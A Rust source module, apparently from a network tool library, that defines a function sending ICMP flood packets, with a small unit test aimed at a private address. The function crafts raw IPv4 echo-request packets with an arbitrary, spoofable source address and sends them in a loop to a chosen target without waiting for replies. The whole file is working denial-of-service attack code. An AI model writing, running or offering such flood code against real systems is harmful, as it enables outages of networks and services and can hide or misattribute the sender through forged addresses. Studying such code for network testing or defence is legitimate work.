use anyhow::Result;
use chrono::Utc;
use pnet::packet::icmp;
use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
use pnet::packet::icmp::IcmpCode;
use pnet::packet::icmp::IcmpType;
use pnet::packet::icmp::MutableIcmpPacket;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4;
use pnet::packet::ipv4::Ipv4Flags;
use pnet::packet::ipv4::MutableIpv4Packet;
use rand::Rng;

use std::net::Ipv4Addr;
use std::time::Duration;

use crate::layers::layer3_ipv4_send;
use crate::layers::ICMP_HEADER_SIZE;
use crate::layers::IPV4_HEADER_SIZE;

const TTL: u8 = 64;
pub fn send_icmp_flood_packet(
    src_ipv4: Ipv4Addr,
    _: u16, // unified interface
    dst_ipv4: Ipv4Addr,
    _: u16, // unified interface
    max_same_packet: usize,
) -> Result<usize> {
    const ICMP_DATA_SIZE: usize = 16;
    let mut rng = rand::thread_rng();
    // ip header
    let mut ip_buff = [0u8; IPV4_HEADER_SIZE + ICMP_HEADER_SIZE + ICMP_DATA_SIZE];
    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff).unwrap();
    ip_header.set_version(4);
    ip_header.set_header_length(5);
    ip_header.set_source(src_ipv4);
    ip_header.set_destination(dst_ipv4);
    ip_header.set_total_length((IPV4_HEADER_SIZE + ICMP_HEADER_SIZE + ICMP_DATA_SIZE) as u16);
    let id = rng.gen();
    ip_header.set_identification(id);
    ip_header.set_flags(Ipv4Flags::DontFragment);
    ip_header.set_ttl(TTL);
    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
    let c = ipv4::checksum(&ip_header.to_immutable());
    ip_header.set_checksum(c);

    let mut icmp_header = MutableEchoRequestPacket::new(&mut ip_buff[IPV4_HEADER_SIZE..]).unwrap();
    icmp_header.set_icmp_type(IcmpType(8));
    icmp_header.set_icmp_code(IcmpCode(0));
    icmp_header.set_sequence_number(1);
    // icmp_header.set_identifier(2);
    icmp_header.set_identifier(rng.gen());
    let mut tv_sec = Utc::now().timestamp().to_be_bytes();
    tv_sec.reverse(); // Big-Endian
    let mut tv_usec = Utc::now().timestamp_subsec_millis().to_be_bytes();
    tv_usec.reverse(); // Big-Endian
    let mut timestamp = Vec::new();
    timestamp.extend(tv_sec);
    timestamp.extend(tv_usec);
    // println!("{:?}", timestamp);
    icmp_header.set_payload(&timestamp);

    let mut icmp_header = MutableIcmpPacket::new(&mut ip_buff[IPV4_HEADER_SIZE..]).unwrap();
    let checksum = icmp::checksum(&icmp_header.to_immutable());
    icmp_header.set_checksum(checksum);
    let timeout = Duration::new(0, 0); // not wait the result

    let mut count = 0;
    for _ in 0..max_same_packet {
        let _ret = layer3_ipv4_send(src_ipv4, dst_ipv4, &ip_buff, vec![], timeout)?;
        count += 1;
    }

    Ok(ip_buff.len() * count)
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_icmp_flood_packet() {
        let src_ipv4 = Ipv4Addr::new(192, 168, 72, 128);
        let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 2);
        let ret = send_icmp_flood_packet(src_ipv4, 0, dst_ipv4, 0, 3).unwrap();
        println!("{:?}", ret);
    }
}
